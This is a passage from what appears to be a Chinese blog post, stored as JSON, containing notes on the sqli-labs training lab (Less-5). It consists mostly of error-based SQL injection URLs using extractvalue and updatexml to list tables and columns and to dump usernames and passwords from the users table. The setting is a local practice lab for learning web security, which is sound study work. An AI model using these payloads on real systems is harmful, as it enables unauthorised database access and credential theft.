extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))--+\n\n\n获取字段名\n\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot; and table_schema&#x3D;database()))))--+\n\n\n获取数据\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1)--+\n#1依次加31即可\n\n","slug":"sqli-labs笔记","date":"2022-06-07T06:44:48.000Z","categories_index":"web安全","tags_index":"web安全,测试","author_index":"cCor4ng3"}]